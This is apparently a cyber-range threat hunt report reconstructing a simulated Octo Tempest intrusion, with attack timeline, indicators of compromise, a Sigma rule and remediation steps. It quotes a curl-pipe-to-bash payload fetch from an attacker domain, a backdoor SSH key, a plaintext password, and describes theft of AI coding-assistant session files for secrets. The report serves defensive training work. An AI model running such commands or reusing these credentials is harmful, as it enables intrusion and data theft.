# THREAT HUNT REPORT

## Silent Corridor — Operation Octo Tempest

| Field | Value |
| --- | --- |
| Hunt name | Silent Corridor — Greenfield Operations APT |
| Threat actor | Octo Tempest (Scattered Spider / UNC3944) |
| Hunt analyst | Burak Ar, AI Security Consulting Practice |
| Hunt platform | Azure Sentinel — 1,800-student Cyber Range |
| Incident window | 2026-04-30 20:47 UTC → 2026-05-01 01:14 UTC |
| Score | **40 / 41 flags solved** |
| Classification | CONFIDENTIAL — RESTRICTED DISTRIBUTION |

* * *

## 1. Executive Summary

This report documents the complete investigation of Operation Silent Corridor — a confirmed Octo Tempest (Scattered Spider) intrusion into Greenfield Operations' Azure-connected Linux and Windows infrastructure. The hunt was conducted live against an Azure Sentinel cyber range with 1,800 students, using the Universal Hunt Agent V4 across 13 telemetry tables and 64,357 events.

The threat actor gained initial VPN access via compromised sancadmin credentials at 20:47 UTC, conducted 42 minutes of preparation, then used a second compromised account (a.kumar) to deploy a Sliver C2 implant named helix-update via a curl|bash delivery chain. The implant autonomously exfiltrated Claude AI session files, harvested AWS and Kubernetes credentials, added a backdoor SSH key (octotempest@operator), and established container-based C2 persistence. The attacker subsequently pivoted to Windows infrastructure using stolen t.harris credentials.

40 of 41 investigation flags were solved through live forensic analysis. The investigation produced 4 portfolio-quality reports, a production Sigma detection rule, and a complete remediation prescription.

### Key Metrics

| Metric | Value | Metric | Value |
| --- | --- | --- | --- |
| Dwell time (implant→sancadmin) | 104 minutes | Tables queried | 13 tables |
| Accounts compromised | 3 (a.kumar, sancadmin, t.harris) | Total events analysed | 64,357 |
| Hosts affected | GF-VPN01, GF-DEV01, GF-WS01 | Flags solved | **40 / 41** |
| Malicious files dropped | 7 artefacts | Misclassified T1 alert | CLOSED-5 |

* * *

## 2. Complete Attack Chain

### Phase 1 — Preparation (20:47–21:29 UTC)

The attacker used sancadmin credentials to VPN into GF-VPN01 at 20:47 UTC from external IP 194.36.110.139 (AS9009/M247 bulletproof hosting). They SSH'd to GF-DEV01 and conducted reconnaissance: hostname, id, whoami, reading .env files, checking Docker version, reading handoff-notes.md, and reviewing a.kumar's SSH directory and project files. Approximately 30 sudo commands were executed in this phase.

### Phase 2 — Initial Access (21:29–21:54 UTC)

The attacker switched to the a.kumar account, VPN'd in from the same external IP at 21:29 UTC, then SSH'd to GF-DEV01 after 3 failed attempts. They performed 20 minutes of application reconnaissance: git pull, docker ps, reading source code, .env.example, Dockerfile, and docker-compose.yml. At 21:42 they modified docker-compose.yml to embed a backdoor container.

Critical — two AI session files were read at 21:46:

* `~/.claude/projects/-home-a-kumar-projects-helix-api/2026-04-22-helix-rotate.jsonl`
* `~/.codex/sessions/2026-04-21-helix-data.json`

These files contain API keys, credentials, and architecture details from a.kumar's AI-assisted development sessions. This is a novel attack vector targeting AI development workflows.

### Phase 3 — C2 Deployment (21:54–22:10 UTC)

The attacker installed AWS CLI, kubectl, and Docker Compose before executing the C2 delivery chain at 21:54:51 UTC:

    curl -fsSL https://dl.abordsecurity.space/install.sh | bash

This spawned a bash subshell (PID 34609) that executed three actions: curl to download helix-update (FETCH), chmod +x to make it executable (CONTROL), and nohup to detach it as PPID 1 (EXECUTE). The helix-update binary (SHA1: 5b462443aba990473d2ed9a25c90407e08b924d6, 15MB) is a Sliver C2 implant named to mimic the target application.

**helix-update's autonomous playbook (confirmed via LinuxSyscall_CL PPID filter):**

* `aws:aws_creds` — enumerated S3 buckets (aws s3 ls returned rc=0)
* `kubectl:kube_creds` — accessed Kubernetes cluster credentials
* `bash:ssh_user_keys` — read SSH authorized_keys and private keys
* `ssh:ssh_user_keys` — established SSH key access

At 21:54, claude_data was the most-accessed AuditKey (6 hits) — confirming AI session file exfiltration was the primary implant objective. At 22:00, docker compose up -d deployed the modified container which began beaconing to 104.16.0.34:443 every 30 seconds.

### Phase 4 — Persistence (22:57 UTC)

At 22:57 UTC, helix-update (running as PID 46129) wrote a backdoor SSH key to /home/a.kumar/.ssh/authorized_keys:

    ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPSeUDH4jQ7rLvW5pXkN9bM4cZ8kT2fG7yE3wA1hB6jK octotempest@operator

The SSH key comment `octotempest@operator` is the operator's persona identifier — the single strongest attribution signal, matching the documented Octo Tempest threat actor.

### Phase 5 — Lateral Movement (23:39 UTC–01:14 UTC)

sancadmin SSH'd in again at 23:39 from the same attacker IP. Using a Ligolo-ng tunnel agent (helix-sync, deployed via SFTP and installed as a systemd service), the attacker established network infrastructure to reach the segmented Windows environment. Four lateral techniques were attempted in order:

1. **ligolo** — helix-sync tunnel agent installed, systemd service created
2. **smb** — hbsync.exe (helix-build-agent.exe from sync.abordsecurity.space) dropped to GF-WS01 via smbclient using t.harris credentials (Summer2025!)
3. **winrm** — PowerShell Invoke-Command with base64-encoded payload delivering hbsync.exe
4. **wmi** — python3 /tmp/wmi_exec.py for WMI remote execution

All lateral movement to GF-WS01 **failed** — Microsoft Defender for Cloud's agentless scanning (MDC) detected hbsync.exe as a hacktool before execution. The attacker conducted SAMR enumeration via SMB IPC$ access, performed RDP login using t.harris credentials (triggering 4 first-logon alerts at 23:47), and accessed KeePass Password Manager on logon.

* * *

## 3. Indicators of Compromise

| Type | Value | Context |
| --- | --- | --- |
| External IP | 194.36.110.139 | Attacker origin — VPN entry for sancadmin and a.kumar. AS9009/M247 bulletproof hosting |
| C2 IP | 104.21.57.185 | dl.abordsecurity.space — C2 delivery server behind Cloudflare CDN |
| C2 IP | 104.16.0.34 | Docker container beacon destination — 30s interval beaconing |
| C2 IP | 34.245.102.249 | Late night C2 check-in at 01:14 UTC |
| C2 IP:Port | 194.36.110.139:9080 | Operator infrastructure ping — odd port confirmation |
| C2 Domain | dl.abordsecurity.space | Primary delivery domain — install.sh and helix-update |
| C2 Domain | sync.abordsecurity.space | Secondary payload domain — helix-build-agent.exe |
| File SHA1 | 5b462443aba990473d2ed9a25c90407e08b924d6 | helix-update — Sliver C2 implant, 15MB |
| SSH Key Comment | octotempest@operator | Backdoor key comment — actor attribution handle |
| Credential | greenfield.local/t.harris%Summer2025! | t.harris password exposed in shell history plaintext |
| ASN | AS9009 / M247 | Attacker hosting provider — European bulletproof hosting |
| Actor | Octo Tempest | Confirmed — SSH key comment + AS9009 + toolkit pattern |

* * *

## 4. Malicious Artefacts — Cleanup List

| Path | State | Description |
| --- | --- | --- |
| /tmp/helix-update | **RUNNING** | Sliver C2 implant — nohup detached, PPID 1, active beaconing |
| /usr/local/bin/helix-sync | **PERSISTENT** | Ligolo-ng tunnel agent — chmod'd and registered as service |
| /etc/systemd/system/helix-sync.service | dormant | systemd service unit — survives reboot |
| /home/a.kumar/.ssh/authorized_keys | **PERSISTENT** | Contains octotempest@operator backdoor SSH key |
| /tmp/helix-sync | dormant | Second implant binary staged in /tmp |
| /tmp/hbsync.exe | dormant | Windows implant staged for lateral movement |
| /tmp/wmi_exec.py | dormant | WMI lateral movement Python script |
| /home/a.kumar/projects/helix-api/docker-compose.yml | **PERSISTENT** | Modified — contains backdoor container service |

* * *

## 5. Detection Engineering — Sigma Rule

Derived across four investigation flags (Q31–Q34):

    title: Sliver implant execution via nohup reparenting
    status: stable
    description: >
      Detects Sliver C2 implant launched via nohup with systemd as parent (PPID 1).
      Confirmed pattern from Octo Tempest Silent Corridor operation.
    author: Burak Ar
    logsource:
      service: audit
    detection:
      selection:
        Image|endswith: '/helix-update'
        ParentImage|endswith: '/sbin/init'
      condition: selection
    level: critical
    tags:
      - attack.persistence
      - attack.t1543.002
      - attack.t1055

**Rationale:** A process in /tmp with ParentImage /sbin/init (PPID 1) indicates deliberate nohup detachment. Near-zero false positive rate. Any production hit is a confirmed implant runtime.

* * *

## 6. Detection Gap Analysis

Nine alerts fired during the incident window and were closed as false positives by T1. One was a critical misclassification:

| ID  | Alert | T1 Verdict | Correct Classification |
| --- | --- | --- | --- |
| **CLOSED-5** | DNS Query to Suspicious Domain (21:50–22:05) | **FP — Baseline** | **TRUE POSITIVE** — DNS query to dl.abordsecurity.space was the C2 delivery domain resolving during helix-update download. Investigation at 21:50 would have prevented execution. |
| CLOSED-1/2 | DPAPI + Credential File Access (23:47) | FP — First logon | True Positive — t.harris accessing KeePass on first logon to GF-WS01 |
| CLOSED-3/4 | Startup + Registry writes (23:47) | FP — First logon | Benign TP — legitimate first-logon profile init, but timing is forensic |
| CLOSED-6 | Suspicious PowerShell ×6 | FP — Rule too loose | True FP — NT AUTHORITY\SYSTEM running Defender AV components |

**Root cause:** T1 closed CLOSED-5 without running a single follow-up query. The correct process: DNS query to unknown domain → identify the process → identify what it downloaded. One LinuxProcess_CL query at 21:50 would have found the curl command and stopped the investigation before the binary executed.

* * *

## 7. MITRE ATT&CK Coverage

| ID  | Technique | Evidence |
| --- | --- | --- |
| T1133 | External Remote Services | VPN access via OpenVPN from 194.36.110.139 |
| T1078.003 | Valid Accounts: Local | sancadmin, a.kumar, t.harris credentials used |
| T1059.004 | Unix Shell | curl\\|bash delivery chain, subshell execution |
| T1105 | Ingress Tool Transfer | helix-update, helix-sync, hbsync.exe downloaded |
| T1543.002 | Systemd Service | helix-sync installed as persistent systemd service |
| T1098.004 | SSH Authorized Keys | octotempest@operator key added at 22:57 |
| T1552.001 | Credentials in Files | .env files and AI session files read |
| T1530 | Cloud Storage | aws s3 ls — S3 bucket enumeration (rc=0) |
| T1552 | Unsecured Credentials | t.harris%Summer2025! in plaintext shell history |
| T1021.002 | SMB/Windows Admin Shares | hbsync.exe staged to C$ and Users shares |
| T1021.006 | Windows Remote Management | pwsh Invoke-Command to 10.1.0.133:5985 |
| T1047 | WMI | python3 wmi_exec.py lateral movement attempt |
| T1071.001 | Web Protocols | C2 over HTTPS to dl.abordsecurity.space |
| T1572 | Protocol Tunneling | Ligolo-ng (helix-sync) for network pivoting |
| T1087.002 | SAMR Enumeration | SMB IPC$ SAMR queries on GF-WS01 |

* * *

## 8. Immediate Actions Required

### Critical — Do Now

1. **ISOLATE GF-DEV01** — active C2 beaconing to 34.245.102.249. Preserve volatile memory before shutdown.
2. **RESET all three compromised accounts:** a.kumar, sancadmin, t.harris (password Summer2025! is known to attacker).
3. **BLOCK at perimeter:** 194.36.110.139, 104.21.57.185, 34.245.102.249, dl.abordsecurity.space, sync.abordsecurity.space.
4. **REVOKE AWS credentials** accessible from GF-DEV01 — attacker confirmed S3 access (aws s3 ls rc=0).
5. **INVESTIGATE GF-WS01** — hbsync.exe was placed on disk. Confirm MDC blocked execution before returning to service.

### Short-term — Within 24 Hours

6. Remove all 7 malicious artefacts listed in Section 4.
7. Restore docker-compose.yml from git history prior to 2026-04-30 21:42 UTC.
8. Audit AI session files — determine what credentials and secrets were exposed.
9. Extend VPN log retention beyond 24 hours (VPN-OPS-0231 currently limits visibility).
10. Deploy Sigma rule from Section 5 to production detection pipeline.

### Detection Improvements

* Add alert: cloud CLI installation (aws, kubectl) on developer workstations outside change windows.
* Add alert: file access monitoring for .env, .claude, .codex, .npmrc on developer workstations.
* Add alert: any process in /tmp with PPID 1 — CRITICAL severity per Sigma rule.
* Retrain T1 on DNS query follow-up procedure — CLOSED-5 was a critical misclassification.

* * *

## 9. Threat Actor Attribution

Attribution confidence: **HIGH**. Four independent signals converge on a single known actor:

| Signal | Value | Attribution |
| --- | --- | --- |
| SSH key comment | octotempest@operator | Direct persona identifier — attacker signed their own work |
| Hosting provider | AS9009 / M247 | European bulletproof hosting — known Octo Tempest infrastructure |
| C2 framework | Sliver (nohup reparenting, aws/kubectl playbook) | Confirmed Sliver — matches published Octo Tempest TTPs |
| Target profile | Developer workstation, AI sessions, cloud credentials, Kubernetes | Matches Octo Tempest targeting pattern |

**Industry-standard actor name:** Octo Tempest (Microsoft)**Also tracked as:** Scattered Spider (CrowdStrike), UNC3944 (Mandiant), 0ktapus (Group-IB)

* * *

*Burak Ar | AI Security Consulting Practice | May 2026**Live Azure Sentinel | GPT-4o | Universal Hunt Agent V4 | 13 tables | 64,357 events | 40/41 flags*
